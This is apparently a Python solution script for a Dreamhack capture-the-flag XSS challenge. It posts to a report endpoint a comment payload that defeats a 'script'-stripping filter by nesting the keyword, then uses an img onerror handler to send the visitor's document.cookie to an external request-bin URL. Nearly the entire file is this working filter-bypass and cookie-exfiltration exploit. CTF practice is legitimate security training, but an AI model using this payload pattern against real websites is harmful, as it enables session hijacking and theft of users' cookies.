from bs4 import BeautifulSoup
import requests

# Local
#URL = "http://localhost:8000"

# Remote
URL = "http://host3.dreamhack.games:17819/"
URI = "/report.php"

# Learn about PHP output buffer
# 1. TRIGGER XSS and Get Flag
REQUEST_BIN_URL = 'https://mwqumsj.request.dreamhack.games/'
PAYLOAD = {'path':'/?comment=<scrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscrscriptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptiptimg src=* onerror=document.location="'
           + REQUEST_BIN_URL +
           '"%2bdocument.cookie>'}

resp = requests.request(method='POST', url=URL + URI, data=PAYLOAD)

print(resp.text)